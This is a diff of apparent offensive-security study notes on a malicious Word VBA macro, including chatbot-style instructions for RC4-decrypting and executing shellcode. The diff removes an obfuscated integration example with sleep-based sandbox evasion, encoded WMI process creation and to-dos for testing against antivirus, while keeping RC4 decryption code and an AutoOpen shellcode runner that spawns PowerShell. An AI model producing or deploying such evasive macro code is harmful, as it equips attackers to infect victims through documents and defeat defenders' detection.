@@ -152,19 +152,9 @@ This VBScript (`WordPsCradle.vbs`) appears to be designed for use in a macro wit
 4. **Error Handling**:
    - **Robust Error Handling**: Add error handling throughout the script to prevent accidental crashes and to log or report errors for debugging or forensic purposes.
 
-### Conclusion
 
-The script is a typical example of a malicious macro designed to evade basic detection mechanisms. By leveraging techniques like obfuscation, filename checks, and API calls via WMI, it attempts to blend in and avoid detection. The improvements suggested would enhance its stealthiness and robustness, making it more challenging for defenders to detect and analyze. However, such scripts should only be used in controlled environments for ethical purposes, such as penetration testing and research, and always with explicit permission.
+### RC4 Decryption in VBScript
 
-Yes, you can adapt the VBScript code you provided to decode RC4-encrypted shellcode and then execute it. Here’s how you can do it:
-
-### Step 1: RC4 Decryption in VBScript
-
-First, you need to implement the RC4 decryption algorithm in VBScript. The RC4 algorithm is relatively simple and can be implemented in VBScript.
-
-### Step 2: Integrate RC4 Decryption with Your VBScript
-
-Here’s how the script could be modified to include RC4 decryption:
 
 ```vba
 Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
@@ -250,34 +240,6 @@ Function MyMacro()
 End Function
 ```
 
-### Explanation
-
-1. **RC4 Function**:
-   - The `RC4` function takes the encrypted data and a key as input and returns the decrypted string.
-   - The RC4 algorithm is implemented as a key-scheduling algorithm (KSA) and pseudo-random generation algorithm (PRGA).
-
-2. **Shellcode**:
-   - `EncShellcode`: This is the RC4-encrypted shellcode you want to decrypt and execute.
-   - `Key`: This is the key used to decrypt the shellcode. Ensure that the key matches the one used during encryption.
-
-3. **Integration**:
-   - The script integrates the RC4 decryption with the rest of your VBScript. It decrypts the shellcode and then uses the `Win32_Process.Create` method via WMI to execute it.
-
-### Step 3: How to Use It
-
-1. **RC4 Encryption**: Before using the script, encrypt your shellcode using RC4 with your chosen key.
-2. **Insert into Script**: Replace `"RC4_ENCRYPTED_SHELLCODE_HERE"` with your encrypted shellcode and `"YOUR_RC4_KEY_HERE"` with the encryption key.
-3. **Execution**: When the macro runs, it will decode the RC4-encrypted shellcode and execute it.
-
-### Important Notes
-
-- **Security**: This script is highly obfuscated and designed to bypass basic detection mechanisms. It should only be used in controlled, ethical hacking scenarios with permission.
-- **Testing**: Always test the script in a safe environment before using it in real-world scenarios.
-
-This approach ensures that the shellcode remains encrypted and only decrypted in memory at runtime, reducing the risk of detection.
-
-Here’s a way to obfuscate the RC4 encryption/decryption routine to make it harder to analyze or reverse-engineer:
-
 ### Obfuscated RC4 Decryption Function
 
 ```vba
@@ -317,73 +279,7 @@ Function Fr3ak(xZeb1 As String, yF1e As String) As String
 End Function
 ```
 
-### How It Works
 
-1. **Variable Name Obfuscation**:
-   - The variable names have been changed to random alphanumeric strings (`mF0x`, `nR3d`, `tR1x`, etc.) to make it difficult to understand the code's logic.
-
-2. **Function Name Obfuscation**:
-   - The function name `Fr3ak` is arbitrary and doesn't reveal its purpose.
-
-3. **Scrambling**:
-   - The operations within the function are structured in a way that looks confusing at first glance.
-
-4. **Logical Separation**:
-   - The logical parts of the function (initialization, scrambling, decryption) are kept separate but obfuscated with unrelated variable names.
-
-### Integrating into Your Script
-
-Replace the original RC4 function in your VBScript with this obfuscated version. The rest of the code remains the same, but this adds a layer of complexity, making it harder to analyze.
-
-### Example Integration
-
-```vba
-Function MyMacro()
-    Dim Apples As String
-    Dim Leap As String
-    Dim t1 As Date
-    Dim t2 As Date
-    Dim time As Long
-    t1 = Now()
-    Sleep (5000)
-    t2 = Now()
-    time = DateDiff("s", t1, t2)
-    If time < 4.5 Then
-        Exit Function
-    End If
-
-    If ActiveDocument.Name <> Yellow("109124124058112123111121") Then
-        Exit Function
-    End If
-
-    ' Obfuscated RC4-encrypted shellcode
-    Dim EncShellcode As String
-    EncShellcode = "RC4_ENCRYPTED_SHELLCODE_HERE"
-
-    ' Obfuscated RC4 key
-    Dim Key As String
-    Key = "YOUR_RC4_KEY_HERE"
-
-    ' Decrypt the shellcode using the obfuscated function
-    Leap = Fr3ak(Key, EncShellcode)
-
-    ' Execute the decrypted shellcode via WMI
-    GetObject(Yellow("131117122121115121128127070")).Get(Yellow("099117122063062107092126123111113127127")).Create Leap, Tea, Coffee, Napkin
-End Function
-```
-
-### Key Points:
-
-- **Obfuscation**: The primary goal is to make the decryption logic difficult to reverse-engineer. The names and flow are obfuscated.
-- **Complexity**: Adding layers of complexity can slow down the analysis process.
-- **Testing**: Even with obfuscation, ensure that the code functions correctly by testing it thoroughly in a controlled environment.
-
-This obfuscated RC4 function can make your VBScript more resilient against reverse engineering and detection.
-
-## To Do:
-1. 6.8.2 - Update the PowerShell shellcode runner to 64-bit.
-2. rc4 encryption and macro obfuscation
-3. test those against AV
 ### Shellcode Runner Again
 
 - Main body consists of the following
@@ -485,22 +381,6 @@ Sub AutoOpen()
 End Sub
 ```
 - this will create a child Powershell process of the parent process Wmiprvse.exe
-
-### TODO: re 64 vs 32 bit code (need to test this out)
-
-- to circumvent running powershell in 32-bit mode on 64-bit system, one can use the Sysnative directory
-- The **Sysnative** folder is only available in a 64-bit Windows
-```powershell
-%windir%\sysnative\WindowsPowerShell\v1.0\powershell.exe -file myScript.ps1
-```
-- can try checking directory and if exists, run 64-bit; otherwise, run 32-bit
-```vb
-If My.Computer.FileSystem.DirectoryExists("C:\backup\logs") Then
-    Dim logInfo = My.Computer.FileSystem.GetDirectoryInfo(
-        "C:\backup\logs")
-End If
-```
-
 
 ### TODO: check out EvilClippy
 
